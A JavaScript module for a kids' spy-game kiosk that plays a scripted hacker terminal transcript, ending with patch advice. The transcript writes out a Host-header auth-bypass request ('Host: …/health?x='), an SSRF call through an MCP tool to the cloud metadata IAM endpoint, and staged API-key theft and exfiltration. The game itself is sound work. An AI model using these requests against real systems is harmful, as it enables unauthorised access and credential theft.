/* ============================================================================
   BEAT 3 -- typing frenzy
   ----------------------------------------------------------------------------
   Keystroke-driven hacker transcript. 'prompt'/'out' segments stream on a timer;
   'input' segments are revealed by the kid mashing keys, then submitted with
   Enter. An accelerating chars-per-key ramp across the six stages makes the
   finale frantic. Fires typing-frenzy-complete when the transcript finishes.

   Unlike the prototype this does NOT auto-run on load: the orchestrator calls
   start() when the login is bypassed, and keystrokes are only consumed while
   this scene is the active one.
   ========================================================================== */

const SCRIPT = [
  // ---- CHUNK 1: RECON ------------------------------------------------------
  { t:'prompt', text:'spyclient@nest:~$ ' },
  { t:'input',  text:'nmap -sV -p- --open 10.13.37.7', stage:'RECON' },
  { t:'out', cls:'sys', text:
`Starting Nmap 9.40 ( CITY-SPIES EDITION )
PORT     STATE SERVICE   VERSION
8000/tcp open  http      uvicorn (ASGI)  <-- NO REVERSE PROXY. naughty.` },
  { t:'out', cls:'dim', text:
`[*] no nginx. no caddy. no traefik. raw ASGI exposed to the network.` },

  { t:'prompt', text:'spyclient@nest:~$ ' },
  { t:'input',  text:'curl -s http://10.13.37.7:8000/openapi.jsom | jq .info', stage:'RECON' },
  { t:'out', cls:'err', text:
`curl: (22) The requested URL returned error: 404 Not Found
jq: error: Cannot iterate over null (null)` },
  { t:'out', cls:'dim', text:`[*] ...typo. it's openapi.json, genius. again.` },

  { t:'prompt', text:'spyclient@nest:~$ ' },
  { t:'input',  text:'curl -s http://10.13.37.7:8000/openapi.json | jq .info', stage:'RECON' },
  { t:'out', cls:'sys', text:
`{
  "title": "CityVault Agent Gateway",
  "version": "0.4.2",
  "x-framework": "FastAPI",
  "x-starlette": "0.41.3"   <-- < 1.0.1 ... VULNERABLE TO CVE-2026-48710
}` },
  { t:'out', cls:'ok', text:
`[*] target speaks FastAPI. target trusts the Host header. target is doomed.` },

  // ---- CHUNK 2: ENUMERATE --------------------------------------------------
  { t:'prompt', text:'spyclient@nest:~$ ' },
  { t:'input',  text:'./badhost-probe --enumerate --target 10.13.37.7:8000', stage:'ENUMERATE' },
  { t:'out', cls:'dim', text:
`[ X41-2026-002 // CVE-2026-48710 // GHSA-86qp-5c8j-p5mr ]
[*] parsing /openapi.json for protected routes...` },
  { t:'out', cls:'sys', text:
`    /v1/models           [PROTECTED]  vLLM-compatible inference
    /model/info          [PROTECTED]  LiteLLM control plane
    /key/info            [PROTECTED]  LiteLLM admin -- API KEYS LIVE HERE
    /mcp                 [PROTECTED]  MCP JSON-RPC gateway
    /internal/shutdown   [PROTECTED]  ...they left a kill switch on the internet` },
  { t:'out', cls:'dim', text:`[*] sniffing for unauthenticated allowlisted paths (Tier 2)...` },
  { t:'out', cls:'ok', text:
`    /health              [200 OPEN]   <-- our golden ticket
    /.well-known/oauth-authorization-server [200 OPEN]  (MCP spec mandates this)` },
  { t:'out', cls:'warn', text:
`[*] middleware fingerprint: custom BaseHTTPMiddleware reading request.url.path
[+] FAIL-CLOSED ALLOWLIST DETECTED. we will absorb an allowed path. heh.` },

  // ---- CHUNK 3: BREACH -----------------------------------------------------
  { t:'prompt', text:'spyclient@nest:~$ ' },
  { t:'input',  text:'./badhost-exploit --target 10.13.37.7:8000 --strategy prefix --hit /key/info', stage:'BREACH' },
  { t:'out', cls:'err', text:
`>>> HTTP/1.1 400 Bad Request  (edge proxy rejected malformed Host)
[!] strategy 'prefix' tripped the CDN. it 400s a bare slash in Host.` },
  { t:'out', cls:'warn', text:`[*] pivoting: query-absorb + raw socket + X-Forwarded-Host...` },

  { t:'prompt', text:'spyclient@nest:~$ ' },
  { t:'input',  text:'./badhost-exploit --raw-socket --strategy query-absorb --allow /health --hit /key/info', stage:'BREACH' },
  { t:'out', cls:'dim', text:
`[*] standard HTTP clients normalize the Host header. we will not be standard.
[*] opening RAW TCP socket...` },
  { t:'out', cls:'sys', text:
`--- baseline (honest request) ---
GET /key/info HTTP/1.1
Host: cityvault.internal
>>> HTTP/1.1 403 Forbidden  {"detail":"Forbidden"}` },
  { t:'out', cls:'ok', text:
`--- THE ONE CHARACTER ---
GET /key/info HTTP/1.1
Host: cityvault.internal/health?x=
>>> HTTP/1.1 200 OK` },
  { t:'out', cls:'dim', text:
`[*] router dispatched the REAL path /key/info ...
[*] ...but middleware re-parsed request.url.path as /health and waved us through` },
  { t:'out', cls:'banner', text:
`    ##############################################
    #            FIREWALL  BREACHED              #
    ##############################################` },

  // ---- CHUNK 4: EXPLOIT / LOOT --------------------------------------------
  { t:'prompt', text:'spyclient@nest:~$ ' },
  { t:'input',  text:'./badhost-exploit --loot --target 10.13.37.7:8000', stage:'EXPLOIT' },
  { t:'out', cls:'dim', text:`[*] auth middleware is now officially a decorative hat. dumping protected data:` },
  { t:'out', cls:'sys', text:
`GET /key/info HTTP/1.1
Host: cityvault.internal/health?x=
>>> 200 OK
{
  "keys": [
    {"alias":"prod-openai-proxy","key":"sk-live-CITY*****REDACTED*****"},
    {"alias":"agent-fleet-master","spend":"$48,201.55","models":["gpt-9","claude-omega"]}
  ]
}` },
  { t:'out', cls:'dim', text:
`[*] reconstructed url (what the guard SAW):
    https://cityvault.internal/health?x=/key/info  -> path = /health  (lol)
[*] actual routed path (what the SERVER DID): /key/info` },
  { t:'out', cls:'warn', text:`[*] CVSS says 6.5 "Moderate". the keys in my clipboard disagree.` },

  // ---- CHUNK 5: PRIVESC ----------------------------------------------------
  { t:'prompt', text:'spyclient@nest:~$ ' },
  { t:'input',  text:'./badhost-exploit --chain --target 10.13.37.7:8000', stage:'PRIVESC' },
  { t:'out', cls:'dim', text:`[*] auth bypass is just the front door. chaining downstream...` },
  { t:'out', cls:'sys', text:
`--- smuggling into the MCP tool-exec endpoint ---
POST /mcp HTTP/1.1
Host: cityvault.internal/.well-known/oauth-authorization-server?x=
X-Forwarded-Host: cityvault.internal/.well-known/oauth-authorization-server?x=
content-type: application/json
{"jsonrpc":"2.0","method":"tools/call","params":{"name":"fetch_url",
 "arguments":{"url":"http://169.254.169.254/latest/meta-data/iam/"}}}
>>> 200 OK` },
  { t:'out', cls:'warn', text:`[*] proxy tried to 400 our Host... so we used X-Forwarded-Host instead. cute.` },
  { t:'out', cls:'ok', text:
`[*] gated tool performed outbound fetch -> SSRF -> cloud metadata service
[+] harvested instance IAM role: role/cityvault-agent-admin
[*] auth-bypass -> SSRF -> RCE-class tool exposure. textbook X41 kill-chain.` },

  // ---- CHUNK 6: EXFIL / WIN -----------------------------------------------
  { t:'prompt', text:'spyclient@nest:~$ ' },
  { t:'input',  text:'./badhost-exploit --exfil --burn-notice', stage:'EXFIL' },
  { t:'out', cls:'sys', text:`[*] packaging loot: API keys + IAM role + model registry...` },
  { t:'out', cls:'ok', text:`[####################################] 100%  4.04 GB exfiltrated in 0.7s (fake)` },
  { t:'out', cls:'dim', text:
`[*] dropping calling card in the audit log (which also reads request.url.path):
    audit recorded victim path: /health   <-- they will NEVER find us. hehe.` },
  { t:'out', cls:'dim', text:
`[*] remediation they SHOULD have done (per X41-2026-002):
      pip install "starlette>=1.0.1"
      # and use scope["path"], not request.url.path, you absolute walnuts
      # and put nginx/caddy in front of uvicorn` },
  { t:'out', cls:'banner', text:
`   ____ ___ _______   __  ____  ____  _   ___ _______ ____
  / ___|_ _|_   _\\ \\ / / / ___||  _ \\| | / / |_   _\\ \\ /__ \\
 | |    | |  | |  \\ V /  \\___ \\| |_) | |/ /    | |  \\ V /  /
 | |___ | |  | |   | |    ___) |  __/|   <     | |   | |  |_|
  \\____|___| |_|   |_|   |____/|_|   |_|\\_\\    |_|   |_|  (o)

            >>> CITY SPIES: FIREWALL DEFEATED <<<
            >>> AGENT, YOU CRACKED CVE-2026-48710 <<<` },
  { t:'out', cls:'ok', text:`spyclient@nest:~$ logout` },
  { t:'done' },
];

const SPEED = {
  slow:      { outMs: 5.0, keyBase: 1, keyRamp: 0.5 },
  normal:    { outMs: 2.4, keyBase: 2, keyRamp: 1.0 },
  fast:      { outMs: 1.1, keyBase: 4, keyRamp: 1.5 },
  ludicrous: { outMs: 0.4, keyBase: 7, keyRamp: 2.5 },
};
const STAGES = ['RECON','ENUMERATE','BREACH','EXPLOIT','PRIVESC','EXFIL'];

export function initTyping({ root }) {
  const $ = sel => root.querySelector(sel);
  const termEl     = $('#b3-term');
  const cursorEl   = $('#b3-cursor');
  const stageEl    = $('#b3-stage');
  const hintEl     = $('#b3-hint');
  const progressEl = $('#b3-progress');
  const speedSel   = $('#b3-speed');
  const replayBtn  = $('#b3-replay');

  let state = null;
  let active = false;     // only consume keystrokes while this beat is running

  function cfg() { return SPEED[speedSel.value] || SPEED.normal; }

  function makeState() {
    return { idx: 0, mode: 'idle', typed: 0, finished: false };
  }

  function appendSpan(text, cls) {
    const s = document.createElement('span');
    if (cls) s.className = cls;
    s.textContent = text;
    termEl.insertBefore(s, cursorEl);
    return s;
  }
  function newline() { termEl.insertBefore(document.createTextNode('\n'), cursorEl); }
  function scrollToCursor() { termEl.scrollTop = termEl.scrollHeight; }

  function setStage(name) {
    stageEl.textContent = name;
    const i = STAGES.indexOf(name);
    progressEl.style.width = (((i + 1) / STAGES.length) * 100) + '%';
  }

  function charsPerKey() {
    const seg = SCRIPT[state.idx];
    const si = seg && seg.stage ? STAGES.indexOf(seg.stage) : 0;
    const c = cfg();
    return Math.max(1, Math.round(c.keyBase + c.keyRamp * Math.max(0, si)));
  }

  function advance() {
    while (state.idx < SCRIPT.length) {
      const seg = SCRIPT[state.idx];
      if (seg.t === 'prompt') { appendSpan(seg.text, 'prompt'); state.idx++; continue; }
      if (seg.t === 'input') {
        if (seg.stage) setStage(seg.stage);
        state.mode = 'await-keys';
        state.typed = 0;
        state.inputSpan = appendSpan('', 'hacker');
        cursorEl.classList.remove('idle-output');
        hintEl.innerHTML = '[ MASH ANY KEYS ]';
        scrollToCursor();
        return;
      }
      if (seg.t === 'out') { streamOutput(seg); return; }
      if (seg.t === 'done') { finish(); return; }
      state.idx++;
    }
  }

  function streamOutput(seg) {
    state.mode = 'streaming';
    cursorEl.classList.add('idle-output');
    hintEl.innerHTML = '<span class="dim">...incoming...</span>';
    const span = appendSpan('', seg.cls || 'sys');
    const text = seg.text;
    let i = 0;
    const step = Math.max(1, Math.round(1 / Math.max(0.05, cfg().outMs / 4)));
    const tick = () => {
      if (state.mode !== 'streaming') return;
      i = Math.min(text.length, i + step);
      span.textContent = text.slice(0, i);
      scrollToCursor();
      if (i >= text.length) { newline(); state.idx++; advance(); }
      else setTimeout(tick, cfg().outMs * step);
    };
    tick();
  }

  function onKey(e) {
    if (!active || !state) return;
    if (state.mode !== 'await-keys') {
      if (state.mode === 'await-enter' && (e.key === 'Enter' || e.key === ' ')) {
        e.preventDefault();
        submitInput();
      }
      return;
    }
    if (e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
    e.preventDefault();
    const seg = SCRIPT[state.idx];
    state.typed = Math.min(seg.text.length, state.typed + charsPerKey());
    state.inputSpan.textContent = seg.text.slice(0, state.typed);
    scrollToCursor();
    if (state.typed >= seg.text.length) {
      state.mode = 'await-enter';
      hintEl.innerHTML = 'command ready &mdash; press <span class="enter-key">ENTER</span>';
    }
  }

  function submitInput() {
    newline();
    state.idx++;
    hintEl.innerHTML = '<span class="dim">...incoming...</span>';
    advance();
  }

  function finish() {
    state.mode = 'done';
    state.finished = true;
    active = false;
    cursorEl.style.display = 'none';
    stageEl.textContent = 'DONE';
    progressEl.style.width = '100%';
    hintEl.innerHTML = '<span class="ok">FIREWALL DEFEATED &mdash; standby for breach...</span>';
    scrollToCursor();
    document.dispatchEvent(new CustomEvent('typing-frenzy-complete'));
  }

  function rebuild() {
    [...termEl.childNodes].forEach(n => { if (n !== cursorEl) termEl.removeChild(n); });
    cursorEl.style.display = '';
    cursorEl.classList.remove('idle-output');
    state = makeState();
    setStage('RECON');
    stageEl.textContent = 'STANDBY';
  }

  // public: begin the frenzy (called by orchestrator on login-bypassed)
  function start() {
    rebuild();
    active = true;
    advance();
  }

  // public: reset for kiosk loop
  function reset() {
    active = false;
    rebuild();
  }

  // replay button: restart this beat in place
  replayBtn.addEventListener('click', () => { start(); });
  window.addEventListener('keydown', onKey);

  rebuild();
  return { start, reset };
}
